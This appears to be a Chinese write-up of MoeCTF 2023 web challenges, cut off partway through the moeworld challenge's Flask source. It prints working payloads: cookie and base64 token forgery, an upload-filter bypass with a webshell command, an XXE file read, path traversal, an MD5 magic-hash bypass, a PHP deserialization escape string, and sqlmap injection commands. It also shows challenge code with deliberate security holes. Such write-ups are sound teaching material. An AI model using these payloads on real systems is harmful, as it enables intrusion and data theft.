**写的不好各位师傅见谅**

# HTTP

CHALLENGE: http
DESCRIPTION: 听说这个http里还有个什么东西叫饼干，也不知道是不是吃的

根据题目描述，貌似和数据包有关系使用代理软件连接节点访问发现按照要求提交参数即可获得

![image-20230907111357690](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907111357690.png)

```bash
POST /?UwU=u HTTP/1.1
Host: localhost:64168
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: MoeBrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
X-Forwarded-For:127.0.0.1
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: character=admin
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

Luv=u
```

按照要求提交参数即可

# Web入门指北

解出PDF编码即可



# 彼岸的flag



CHALLENGE: 彼岸的flag
DESCRIPTION: 我们在某个平行宇宙中得到了一段moectf群的聊天记录，粗心的出题人在这个聊天平台不小心泄露了自己的flag

**打开可见一个聊天页面**

![image-20230907151259825](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907151259825.png)

![image-20230907151709517](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907151709517.png)



# cookie

CHALLENGE: cookie
DESCRIPTION: **本题无需扫描器/爆破**
hint: readme只是一个样例，不是拿来复制的

根据题目给出的附件大致意思需要注册用户来登录获取flag

![image-20230907152055953](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152055953.png)

```bash
POST /register HTTP/1.1
Host: localhost:62915
sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: character=guest
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

{
    "username":"abc",
    "password":"123456"
}
```

![image-20230907152326552](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152326552.png)

访问登录接口使用注册的账号进行登录可发现存在token

![image-20230907152633221](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152633221.png)

```
eyJ1c2VybmFtZSI6ICJhYmMiLCAicGFzc3dvcmQiOiAiMTIzNDU2IiwgInJvbGUiOiAidXNlciJ9

{"username": "abc", "password": "123456", "role": "user"}

base64
```

![image-20230907153346433](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153346433.png)

```
更改token即可
eyJ1c2VybmFtZSI6ICJhYmMiLCAicGFzc3dvcmQiOiAiMTIzNDU2IiwgInJvbGUiOiAiYWRtaW4ifQ==
{"username": "abc", "password": "123456", "role": "admin"}
base64编码
```

![image-20230907153530460](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153530460.png)

# gas!gas!gas!

CHALLENGE: gas!gas!gas!
DESCRIPTION: Klutton这个假期信心满满地准备把驾照拿下，于是他仔细地学习了好多漂移视频，还准备了这么一个赛博赛车场；诶，不对，开车好像不是用键盘开的？



打开题目需要连续对坚持五伦

![image-20230907153929231](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153929231.png)

查看源码发现存在如下片段

```HTML
 <form action="/" method="POST">
    <label for="driver">选手:</label>
    <input type="text" id="driver" name="driver" required><br><br>
    
    <label for="steering_control">方向控制:</label>
    <select id="steering_control" name="steering_control" required>
      <option value="-1">左</option>
      <option value="0" selected>直行</option>
      <option value="1">右</option>
    </select><br><br>

    <label for="throttle">油门控制:</label>
    <select id="throttle" name="throttle" required>
      <option value="0">松开</option>
      <option value="1">保持</option>
      <option value="2" selected>全开</option>
    </select><br><br>
    
    <input type="submit" value="提交">
  </form>
```

根据这些信息编写脚本即可

```python
import requests
import re
url = 'http://localhost:64461/'
headers = {"Content-Type":"application/x-www-form-urlencoded"}
s = requests.Session()
req_post = s.post(
    url=url,
    data='driver=q1&steering_control=0&throttle=2',
    headers=headers)
print(f'cookies = {s.cookies}')
post_data = 'driver=q1jun&steering_control=0&throttle=2'
print(re.findall(r'<h3><font color="red">(.*)</font></h3></div>',req_post.text)[0])
req = req_post.text
steering_control = 0
throttle = 0
for _ in range(7):
    if '弯道向左' in req_post.text:
        steering_control = 1
    if '弯道向右' in req_post.text:
        steering_control = -1
    if '弯道直行' in req_post.text:
        steering_control = 0
    if '保持这个速度' in req_post.text:
        throttle = 1
    if '抓地力太大了' in req_post.text:
        throttle = 2
    if '抓地力太小了' in req_post.text:
        throttle = 0
    print(f'{steering_control =}')
    print(f'{throttle =}')
    req_post = s.post(
        url=url,
        data=f'driver=q1&steering_control={steering_control}&throttle={throttle}',
        headers=headers
    )
    print(req_post.text)
    # print(re.findall(r'<h3><font color="red">(.*)</font></h3></div>',req_post.text)[0])
    print(f'cookies = {s.cookies}')
```

# moe图床

CHALLENGE: moe图床
DESCRIPTION: 我们准备了一个moe图床用于上传一些图片

![image-20230907154510412](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907154510412.png)

正常的图片没啥问题，php就无法进行上传

![image-20230907154700645](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907154700645.png)

审计js源码发现用点分隔后缀名字多加一个点就把前一个点进行了绕过

![image-20230907155030664](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155030664.png)

图片🐎可成功上传

![image-20230907155156281](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155156281.png)

执行命令即可

```
?cmd=system(%27ls%20/%27);
```

# 解你的座驾

CHALLENGE: 了解你的座驾
DESCRIPTION: 为了极致地漂移，我们准备了一个网站用于查找你喜欢的车车；听说flag也放在里面了，不过不在网站目录放在根目录应该没问题的吧。。。

![image-20230907155632658](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155632658.png)

xml注入使用payload即可

```
xml_content=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%3C!DOCTYPE%20xxe%20%5B%3C!ELEMENT%20name%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fflag%22%20%3E%5D%3E%3Cxml%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Fxml%3E
```

# 大海捞针

CHALLENGE: 大海捞针
DESCRIPTION: 该死，之前的平行宇宙由于flag的泄露被一股神秘力量抹去，我们脱离了与那个宇宙的连接了！不过不用担心，看起来出题人傻乎乎的是具有泄露flag的概率的，我们只需要连接多个平行宇宙...（难道flag在多元宇宙里是全局变量吗）

tips:仅有这道题要用到扫描器，请不要将爆破速度调整过快，flag是一定能找到的
环境：
http://101.42.178.83:7771/

打开题目可见只需要bp跑一到一千的数字即可

```
use /?id=<1-1000> to connect to different parallel universes

```

![image-20230907160340776](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907160340776.png)

![image-20230907160551761](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907160551761.png)

# meo图床

CHALLENGE: meo图床
DESCRIPTION: 我们准备了一个meo(?)图床用于上传一些图片



```
可以直接上传php但是不进行解析，查看发现存在文件包含

```

![image-20230907162316680](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907162316680.png)

```
读取这个发现如下提示
http://localhost:54781/images.php?name=../../../../../../flag

<!--Fl3g_n0t_Here_dont_peek!!!!!.php-->
```

```php
<?php

highlight_file(__FILE__);

if (isset($_GET['param1']) && isset($_GET['param2'])) {
    $param1 = $_GET['param1'];
    $param2 = $_GET['param2'];

    if ($param1 !== $param2) {
        
        $md5Param1 = md5($param1);
        $md5Param2 = md5($param2);

        if ($md5Param1 == $md5Param2) {
            echo "O.O!! " . getenv("FLAG");
        } else {
            echo "O.o??";
        }
    } else {
        echo "o.O?";
    }
} else {
    echo "O.o?";
}

?>
```

md50e进行绕过

```
param1=QNKCDZO&param2=240610708
```

# 夺命十三枪

CHALLENGE: 夺命十三枪
DESCRIPTION: 夺命十三枪！然后是啥来着？

主页如下所示：

```php
<?php
highlight_file(__FILE__);

require_once('Hanxin.exe.php');

$Chant = isset($_GET['chant']) ? $_GET['chant'] : '夺命十三枪';

$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);

$before = serialize($new_visitor);
$after = Deadly_Thirteen_Spears::Make_a_Move($before);
echo 'Your Movements: ' . $after . '<br>';

try{
    echo unserialize($after);
}catch (Exception $e) {
    echo "Even Caused A Glitch...";
}
?>
```

很明显是反序列化，根据代码还有一个’Hanxin.exe.php’页面

```php
<?php

if (basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) {
    highlight_file(__FILE__);
}

class Deadly_Thirteen_Spears{
    private static $Top_Secret_Long_Spear_Techniques_Manual = array(
        "di_yi_qiang" => "Lovesickness",
        "di_er_qiang" => "Heartbreak",
        "di_san_qiang" => "Blind_Dragon",
        "di_si_qiang" => "Romantic_charm",
        "di_wu_qiang" => "Peerless",
        "di_liu_qiang" => "White_Dragon",
        "di_qi_qiang" => "Penetrating_Gaze",
        "di_ba_qiang" => "Kunpeng",
        "di_jiu_qiang" => "Night_Parade_of_a_Hundred_Ghosts",
        "di_shi_qiang" => "Overlord",
        "di_shi_yi_qiang" => "Letting_Go",
        "di_shi_er_qiang" => "Decisive_Victory",
        "di_shi_san_qiang" => "Unrepentant_Lethality"
    );

    public static function Make_a_Move($move){
        foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index => $movement){
            $move = str_replace($index, $movement, $move);
        }
        return $move;
    }
}

class Omg_It_Is_So_Cool_Bring_Me_My_Flag{

    public $Chant = '';
    public $Spear_Owner = 'Nobody';

    function __construct($chant){
        $this->Chant = $chant;
        $this->Spear_Owner = 'Nobody';
    }

    function __toString(){
        if($this->Spear_Owner !== 'MaoLei'){
            return 'Far away from COOL...';
        }
        else{
            return "Omg You're So COOOOOL!!! " . getenv('FLAG');
        }
    }
}

?>
```

问题的关键，关键的问题，就很明显了，存在一个静态引用函数Make_a_Move()其中的

```php
$move = str_replace($index, $movement, $move);

#存在反序列化字符串逃逸，不可控的后缀变的可控制
```

```bash
目的是在夺命十三枪后面修改为";s:11:"Spear_Owner";s:6:"MaoLei";}，该字符串长度为35，根据代码可以知道"di_qi_qiang" => "Penetrating_Gaze",刚好是从11->16，每次转换可以逃逸5个字符串，只需要重复7次"di_qi_qiang"即可完成逃逸



chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang";s:11:"Spear_Owner";s:6:"MaoLei";}
```

# signin

CHALLENGE: signin
DESCRIPTION: 真的是signin（
**本题无需扫描器/爆破**

题目代码:

```python
from secrets import users, salt
import hashlib
import base64
import json
import http.server

with open("flag.txt","r") as f:
    FLAG = f.read().strip()

def gethash(*items):
    c = 0
    for item in items:
        if item is None:
            continue
        c ^= int.from_bytes(hashlib.md5(f"{salt}[{item}]{salt}".encode()).digest(), "big") # it looks so complex! but is it safe enough?
    return hex(c)[2:]

assert "admin" in users
assert users["admin"] == "admin"

hashed_users = dict((k,gethash(k,v)) for k,v in users.items())

eval(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,"big",signed=True).decode().translate({ord(c):None for c in "\x00"})) # what is it?
    
def decrypt(data:str):
        for x in range(5):
            data = base64.b64encode(data).decode() # ummm...? It looks like it's just base64 encoding it 5 times? truely?
        return data

__page__ = base64.b64encode("PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==")
        
class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            if self.path == "/":
                self.send_response(200)
                self.end_headers()
                self.wfile.write(__page__)
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"404 Not Found")
        except Exception as e:
            print(e)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"500 Internal Server Error")

    def do_POST(self):
        try:
            if self.path == "/login":
                body = self.rfile.read(int(self.headers.get("Content-Length")))
                payload = json.loads(body)
                params = json.loads(decrypt(payload["params"]))
                print(params)
                if params.get("username") == "admin":
                    self.send_response(403)
                    self.end_headers()
                    self.wfile.write(b"YOU CANNOT LOGIN AS ADMIN!")
                    print("admin")
                    return
                if params.get("username") == params.get("password"):
                    self.send_response(403)
                    self.end_headers()
                    self.wfile.write(b"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!")
                    print("same")
                    return
                hashed = gethash(params.get("username"),params.get("password"))
                for k,v in hashed_users.items():
                    if hashed == v:
                        data = {
                            "user":k,
                            "hash":hashed,
                            "flag": FLAG if k == "admin" else "flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}"
                        }
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(json.dumps(data).encode())
                        print("success")
                        return
                self.send_response(403)
                self.end_headers()
                self.wfile.write(b"Invalid username or password")
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"404 Not Found")
        except Exception as e:
            print(e)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"500 Internal Server Error")

if __name__ == "__main__":
    server = http.server.HTTPServer(("", 9999), MyHandler)
    server.serve_forever()
```

```
assert users["admin"] == "admin"
users中存在用户名“admin”密码也为“admin”，表面上看需要传入的参数也为admin/admin。


```

![image-20230907210222817](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907210222817.png)

继续分析源码可以发现eval()语句将base64.b64encode覆写为base64.b64decode

```python
def gethash(*items):
    c = 0
    for item in items:
        if item is None:
            continue
        c ^= int.from_bytes(hashlib.md5(f"{salt}[{item}]{salt}".encode()).digest(), "big") # it looks so complex! but is it safe enough?
    return hex(c)[2:]
#当传入的参数items为2个时该函数等价于求两个参数的异或值并返回，所以当两个参数相等时不管该参数为何值，返回值都为0
#而传入参数有两个过滤，username不能等于“admin”，且username不能等于password，而拿到flag需要hashed值为0，怎么才能做到呢？

```

**而传入参数有两个过滤，username不能等于“admin”，且username不能等于password，而拿到flag需要hashed值为0，怎么才能做到呢？**

接下来编写脚本即可把构造的json数据base64编码五次

```python
import requests
import base64

url = "http://localhost:64817/login"
username = "\"1\""
password = "1"
jsondata = "{\"username\":"+f"{username}"+",\"password\":"+f"{password}"+"}"
print(f"{jsondata = }")
for _ in range(5):
    jsondata = base64.b64encode(str(jsondata).encode()).decode()
data = "{\"params\":\""+f"{jsondata}\""+"}"
print(f"{data = }")
req = requests.post(url=url,data=data).text
print(f"{req = }")
```

# 出去旅游的心海

CHALLENGE: 出去旅游的心海
DESCRIPTION: 欢迎来到心海新建的博客！正值假期期间，她抓紧时间出去旅游放松一下，看看她最近都在研究什么？
http://101.42.178.83:7770/



查看源码页面可发现一个php文件链接

![image-20230922215913893](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922215913893.png)

```php
<?php
/*
Plugin Name: Visitor auto recorder
Description: Automatically record visitor's identification, still in development, do not use in industry environment!
Author: KoKoMi
  Still in development! :)
*/

// 不许偷看！这些代码我还在调试呢！
highlight_file(__FILE__);

// 加载数据库配置，暂时用硬编码绝对路径
require_once('/var/www/html/wordpress/' . 'wp-config.php');

$db_user = DB_USER; // 数据库用户名
$db_password = DB_PASSWORD; // 数据库密码
$db_name = DB_NAME; // 数据库名称
$db_host = DB_HOST; // 数据库主机

// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下
// 这些是临时的代码

$ip = $_POST['ip'];
$user_agent = $_POST['user_agent'];
$time = stripslashes($_POST['time']);

$mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);

// 检查连接是否成功
if ($mysqli->connect_errno) {
    echo '数据库连接失败: ' . $mysqli->connect_error;
    exit();
}

$query = "INSERT INTO visitor_records (ip, user_agent, time) VALUES ('$ip', '$user_agent', $time)";

// 执行插入
$result = mysqli_query($mysqli, $query);

// 检查插入是否成功
if ($result) {
    echo '数据插入成功';
} else {
    echo '数据插入失败: ' . mysqli_error($mysqli);
}

// 关闭数据库连接
mysqli_close($mysqli);

//gpt真好用
```

根据测试发现time存在报错注入

![image-20230922220234166](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922220234166.png)

sqlmap一把梭

```bash
python3 sqlmap.py  -u "http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"  --data "time=1"  --dbs  --batch

python3 sqlmap.py  -u "http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"  --data "time=1"  -D wordpress --tables --batch

python3 sqlmap.py  -u "http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"  --data "time=1"  -D wordpress  -T secret_of_kokomi --columns --batch


```

![image-20230922222050154](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922222050154.png)

# moeworld

CHALLENGE: moeworld
DESCRIPTION: 你已经学会了1+1=2，接下来尝试真实的渗透吧~
解压密码为“出去旅游的心海”的flag

下载附件解压得到如下文件



```
本题你将扮演**红队**的身份，以该外网ip入手，并进行内网渗透，最终获取到完整的flag

题目环境：http://47.115.201.35:8000/

在本次公共环境中渗透测试中，希望你**不要做与获取flag无关的行为，不要删除或篡改flag，不要破坏题目环境，不要泄露题目环境！**

**注册时请不要使用你常用的密码，本环境密码在后台以明文形式存储**

hint.zip 密码请在拿到外网靶机后访问根目录下的**readme**，完成条件后获取

环境出现问题，请第一时间联系出题人**xlccccc**

对题目有疑问，也可随时询问出题人
```

根据题目来说看来需要内网遨游了

![image-20230922222659454](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922222659454.png)

一个python搭建的网页这是该网站源码

**app.py**

```python
from curses import flash
from flask import Flask, request, render_template, redirect, session, url_for, flash
import os
import dataSql
import datetime
from hashlib import md5

app = Flask(__name__)

app.template_folder = os.path.join("static/templates")
app.static_folder = os.path.join("static")

app.secret_key = "This-random-secretKey-you-can't-get" + os.urandom(2).hex()


@app.route('/login', methods=['GET', 'POST'])
def login():
    if 'user' not in session:
        if request.method == 'GET':
            return render_template('login.html')
        username = request.form['user']
        password = request.form['password']
        if dataSql.canLogin(username, password):
